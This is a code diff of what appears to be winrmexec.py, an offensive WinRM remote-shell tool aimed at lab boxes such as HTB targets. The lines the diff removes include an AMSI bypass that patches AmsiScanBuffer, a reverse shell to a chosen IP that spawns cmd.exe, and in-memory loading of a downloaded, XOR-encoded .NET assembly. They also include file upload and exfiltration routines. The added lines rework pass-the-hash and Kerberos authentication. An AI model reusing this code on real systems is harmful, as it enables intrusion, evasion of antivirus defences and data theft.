-    def netrun(self, runspace, cmdline):
-        args = split_args(cmdline)
-        if args[0].lower() == "-xor":
-            if len(args) == 1:
-                self.write_warning("missing URL and [ARGS..]")
-                return
-            xorfunc = f"[{_ns}.X]::x"
-            args = args[1:]
-        else:
-            xorfunc = ""
-
-        args = [ str_b64(arg) for arg in args ]
-
-        url = args[0]
-        argv = "[string[]]@(" + ",".join(args[1:]) + ")"
-
-        commands = [
-            host_writer_cs, xor_enc_cs,
-            f"$buf = (New-Object Net.WebClient).DownloadData({url})",
-            f"$dll = [Reflection.Assembly]::Load({xorfunc}($buf))",
-            f"$out = New-Object {_ns}.HostWriter {{ Write-Host -NoNewLine $args }}",
-            f"[Console]::SetOut($out); [Console]::SetError($out)",
-            f"$dll.EntryPoint.Invoke($null,(,{argv}))",
-            f"[Console]::SetOut([IO.StreamWriter]::Null)",
-            f"[Console]::SetError([IO.StreamWriter]::Null)",
-            f"$out.Dispose()",
-            f"Remove-Variable @('buf','dll','out')"
-        ]
-
-        for cmd in commands:
-            logging.debug(cmd)
-            self.run_with_interrupt(runspace, cmd, self.write_line)
-
-
-    def amsi_bypass(self, runspace):
-        ns = "A" + randbytes(2).hex()
-        commands = [
-            _import_LoadLibrary,
-            _import_GetProcAddress,
-            _import_VirtualProtect,
-            f"$addr = {_call_GetProcAddress}({_call_LoadLibrary}({str_b64('amsi.dll')}), {str_b64('AmsiScanBuffer')})",
-            f"{_call_VirtualProtect}($addr, [IntPtr]6, 64, [ref]$null)",
-            f"Start-Sleep -Seconds 1", # this seems to do the trick for now...
-            f"[Runtime.InteropServices.Marshal]::Copy([byte[]](0xb8,0x57,0,7,0x80,0xc3), 0, $addr, 6)",
-            f"Start-Sleep -Seconds 1",
-            f"{_call_VirtualProtect}($addr, [IntPtr]6, 32, [ref]$null)",
-        ]
-        for cmd in commands:
-            logging.debug(cmd)
-            self.run_sync(runspace, cmd)
-
-
-    def revshell(self, runspace, cmdline):
-        args = split_args(cmdline)
-        try:
-            ip, port = ip_address(args[0]).packed, int(args[1])
-            p_hi, p_lo = (port >> 8) & 0xff, port & 0xff
-        except:
-            return
-
-        commands = [
-            _import_WSAStartup, _import_WSASocket, _import_WSAConnect, _import_CreateProcess,
-            f"{_call_WSAStartup}(0x202,(New-Object byte[] 64))",
-            f"$sock = {_call_WSASocket}(2,1,6,0,0,0)",
-            f"{_call_WSAConnect}($sock,[byte[]](2,0,{p_hi},{p_lo},{ip[0]},{ip[1]},{ip[2]},{ip[3]},12,0,0,0,0,0,0,0,0),16,0,0,0,0)",
-            f"$sinfo = [int64[]](104,0,0,0,0,0,0,0x10100000000,0,0,$sock,$sock,$sock)",
-            f"{_call_CreateProcess}(0,'cmd.exe',0,0,1,0,0,0,$sinfo,(New-Object byte[] 32))",
-            f"Remove-Variable @('sock','sinfo')"
-        ]
-
-        for cmd in commands:
-            logging.debug(cmd)
-            self.run_with_interrupt(runspace, cmd, self.write_line)
-
-
-    def upload(self, runspace, cmdline):
-        args = split_args(cmdline)
-
-        if args[0].lower() == "-xor":
-            unxor = False
-            args = args[1:]
-        else:
-            unxor = True
-
-        src = Path(args[0])
-        dst = PureWindowsPath(args[1] if len(args) == 2 else src.name)
-        try:
-            with open(src, "rb") as f:
-                buf = f.read()
-        except IOError as e:
-            self.write_error(str(e))
-            return
-
-        tmpfn = self.run_sync(runspace, "[IO.Path]::GetTempPath()")
-        tmpfn = tmpfn + randbytes(8).hex() + ".tmp"
-        total = 0
-        self.write_info(f"uploading to {tmpfn}")
-
-        self.run_sync(runspace, xor_enc_cs)
-        for chunk in chunks(buf, 65536):
-            total += len(chunk)
-            chunk = xorenc(chunk, _xor_key)
-            xorfunc = f"[{_ns}.X]::x" if unxor else ""
-            ps = f"Add-Content -Encoding Byte '{tmpfn}' ([byte[]]$({xorfunc}([Convert]::FromBase64String('{b64str(chunk)}'))))"
-
-            interrupted = self.run_with_interrupt(runspace, ps)
-            if interrupted:
-                self.write_warning("upload interrupted")
-                self.run_sync(runspace, f"Remove-Item -Force '{tmpfn}'")
-                return
-
-            self.write_progress(f"progress: {total}/{len(buf)}")
-
-        self.write_info(f"moving from {tmpfn} to {dst}")
-        ps = f"Move-Item -Force -Path '{tmpfn}' -Destination '{dst}'"
-        self.run_with_interrupt(runspace, ps, self.write_line)
-
-        ps = f"(Get-FileHash '{dst}' -Algorithm MD5).Hash"
-        out = self.run_sync(runspace, ps)
-        md5sum = MD5.new(buf if unxor else xorenc(buf, _xor_key))
-        if out.strip() != md5sum.hexdigest().upper():
-            self.write_error("Corrupted upload")
-
-
-    def download(self, runspace, cmdline):
-        args = split_args(cmdline)
-        if len(args) == 0 or len(args) > 2:
-            self.write_warning("usage: !download RPATH [LPATH]")
-            return
-
-        src = self.run_sync(runspace, f"Resolve-Path -LiteralPath '{args[0]}' | Select -Expand Path")
-        if not src:
-            self.write_warning(f"{args[0]} not found")
-            return
-
-        src = PureWindowsPath(src)
-
-        dst = Path(args[1]) if len(args) == 2 else Path(src.name)
-        if dst.is_dir():
-            dst = dst.joinpath(src.name)
-
-        if not dst.parent.exists():
-            os.makedirs(dst.parent, exist_ok=True)
-
-        src_is_dir = self.run_sync(runspace, f"Test-Path -Path '{src}' -PathType Container") == "True"
-        if src_is_dir:
-            if not dst.name.lower().endswith(".zip"):
-                dst = Path(dst.parent).joinpath(f"{dst.name}.zip")
-            self.write_info(f"{src} is a directory, will download a zip file of its contents to {dst}")
-
-            tmpdir = self.run_sync(runspace, "[System.IO.Path]::GetTempPath()")
-            tmpnm = randbytes(8).hex()
-            tmpfn = tmpdir + tmpnm
-            ps = f"""
-                Add-Type -AssemblyName "System.IO.Compression.FileSystem"
-                New-Item -Path '{tmpdir}' -ItemType Directory -Name '{tmpnm}' | Out-Null
-                Get-ChildItem -Force -Recurse -Path '{src}' | ForEach-Object {{
-                    if(-not ($_.FullName -Like "*{tmpnm}*")) {{
-                        try {{
-                            $dst = $_.FullName.Replace('{src}', '')
-                            Copy-Item -ErrorAction SilentlyContinue -Force $_.FullName "{tmpfn}\\$dst"
-                        }} catch {{
-                            Write-Warning "skipping $dst"
-                        }}
-                    }}
-                }}
-                {path_fix_cs}
-                [IO.Compression.ZipFile]::CreateFromDirectory('{tmpfn}', '{tmpfn}.zip', [IO.Compression.CompressionLevel]::Fastest, $true, $(New-Object {_ns}.PathFix))
-                Remove-Item -Recurse -Force -Path '{tmpfn}'
-            """
-
-            self.run_with_interrupt(runspace, ps, self.write_line)
-            src = tmpfn + ".zip"
-
-        ps = f"""function Download-Remote {{
-            $h = Get-FileHash '{src}' -Algorithm MD5 | Select -Expand Hash;
-            $f = [System.IO.File]::OpenRead('{src}');
-            $b = New-Object byte[] 65536;
-            while(($n = $f.Read($b, 0, 65536)) -gt 0) {{ [Convert]::ToBase64String($b, 0, $n) }};
-            $f.Close();
-            [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($h));
-            }}
-            Download-Remote
-            Remove-Item Function:Download-Remote
-        """
-
-        self.write_info(f"downloading {src}")
-        def collect(buf, out):
-            if part := out.get("stdout"):
-                buf += b64decode(part)
-                self.write_progress(f"progress: {len(buf)} bytes")
-
-        buf = bytearray()
-        self.run_with_interrupt(runspace, ps, lambda out: collect(buf, out))
-
-        if src_is_dir:
-            self.run_sync(runspace, f"Remove-Item -fo '{src}'") # remove the zip too
-
-        if buf[-32:] != MD5.new(buf[:-32]).hexdigest().upper().encode():
-            self.write_error("Corrupted download or file access error")
-            return
-
-        self.write_info(f"done, writing to {dst.resolve()}")
-        try:
-            with open(dst, "wb") as f:
-                f.write(buf[:-32])
-        except IOError as e:
-            self.write_error(str(e))
-
-
 def main():
-    """# NTLM Examples:
+    """
+# NTLM Examples:
   $ winrmexec.py 'box.htb/username:password@dc.box.htb'
   $ winrmexec.py 'username:password@dc.box.htb'
   $ winrmexec.py -hashes 'LM:NT' 'username@dc.box.htb'
@@ -1506,7 +1064,7 @@ Same as for NTLM except hashes are not supported:
   # winrmexec.py -basic -target-ip '10.10.11.xx' 'username:password@whatever'
   # winrmexec.py -basic -target-ip '10.10.11.xx' -ssl 'username:password@whatever'
   # winrmexec.py -basic -url 'http://10.10.11.xx/endpoint' 'username:password@whatever'
-    """
+"""
 
     print(version.BANNER)
     parser = ArgumentParser()
@@ -1559,8 +1117,8 @@ Same as for NTLM except hashes are not supported:
     parser.add_argument("-X", default="", metavar="COMMAND",
         help="Command to execute, if ommited it will spawn a janky interactive shell")
 
-    parser.add_argument("-log", action="store_true",
-        help="Will log all stdout to 'winrmexec_[timestamp]_stdout.log")
+    parser.add_argument("-timeout", default="5", metavar="SEC", help="Timeout for requests to /wsman")
+
 
     args = parser.parse_args()
 
@@ -1577,11 +1135,13 @@ Same as for NTLM except hashes are not supported:
 
     domain, username, password, targetName = parse_target(args.target)
 
-    if args.aesKey and not args.k: # aesKey implies kerberos
+    if args.aesKey and not args.k:
         logging.info("'-aesKey' key specified, using kerberos")
         args.k = True
 
-    has_creds = password or args.hashes or args.aesKey
+    aes_key = args.aesKey
+    nt_hash = args.hashes.split(':')[1] if ':' in args.hashes else ""
+    has_creds = password or nt_hash or aes_key
 
     if username and not (has_creds or args.no_pass):
         from getpass import getpass
@@ -1589,21 +1149,25 @@ Same as for NTLM except hashes are not supported:
         has_creds = True
 
     if not args.target_ip and not args.url:
-        args.target_ip = targetName
+        target_ip = targetName
         logging.info(f"'-target_ip' not specified, using {targetName}")
+    else:
+        target_ip = args.target_ip
 
     if not args.port:
-        args.port = 5986 if args.ssl else 5985
-        logging.info(f"'-port' not specified, using {args.port}")
+        port = 5986 if args.ssl else 5985
+        logging.info(f"'-port' not specified, using {port}")
+    else:
+        port = args.port
 
     if not args.url:
         if args.ssl:
-            args.url = f"https://{args.target_ip}:{args.port}/wsman"
+            url = f"https://{target_ip}:{port}/wsman"
         else:
-            args.url = f"http://{args.target_ip}:{args.port}/wsman"
-        logging.info(f"'-url' not specified, using {args.url}")
+            url = f"http://{target_ip}:{port}/wsman"
+        logging.info(f"'-url' not specified, using {url}")
     else:
-        args.ssl = urlparse(args.url).scheme == "https"
+        url = args.url
 
     if args.k:
         if os.getenv("KRB5CCNAME"): # use domain/username from ccache
@@ -1621,41 +1185,42 @@ Same as for NTLM except hashes are not supported:
                 pass
 
         if not args.dc_ip:
-            logging.info(f"'-dc_ip' not specified, using {domain}")
-            args.dc_ip = domain
+            logging.info(f"'-dc-ip' not specified, using {domain}")
+            dc_ip = domain
+        else:
+            dc_ip = args.dc_ip
 
         if not args.spn:
-            args.spn = args.spn or f"HTTP/{targetName}@{domain}"
-            logging.info(f"'-spn' not specified, using {args.spn}")
+            spn = args.spn or f"HTTP/{targetName}@{domain}"
+            logging.info(f"'-spn' not specified, using {spn}")
+        else:
+            spn = args.spn
 
-        Transport = KerberosTransport
+        transport = KerberosTransport(url, dc_ip, spn, domain, username, password, nt_hash, aes_key)
 
     elif args.basic:
         if not username or not password:
             logging.fatal(f"Need username and password for basic auth")
             exit()
-        Transport = BasicTransport
+        transport = BasicTransport(url, username, password)
 
     else:
-        if not username or not (password or args.hashes):
+        if not username or not (password or nt_hash):
             logging.fatal(f"Need username and password or hashes for ntlm auth")
             exit()
-        Transport = NTLMTransport
+        transport = NTLMTransport(url, username, password, nt_hash)
 
-    args.domain     = domain
-    args.username   = username
-    args.password   = password
-    args.nt_hash    = args.hashes.split(':')[1] if ':' in args.hashes else ""
+    timeout = int(args.timeout)
 
-    shell = Shell(Transport, args)
-    try:
-        if args.X:
-            shell.repl(iter([args.X]))
-        else:
-            shell.help()
-            shell.repl()
-    except EOFError:
-        pass
+    with Runspace(transport, timeout) as runspace:
+        shell = Shell(runspace)
+        try:
+            if args.X:
+                shell.repl(iter([args.X]))
+            else:
+                shell.repl()
+        except EOFError:
+            pass
 
 if __name__ == "__main__":
     main()
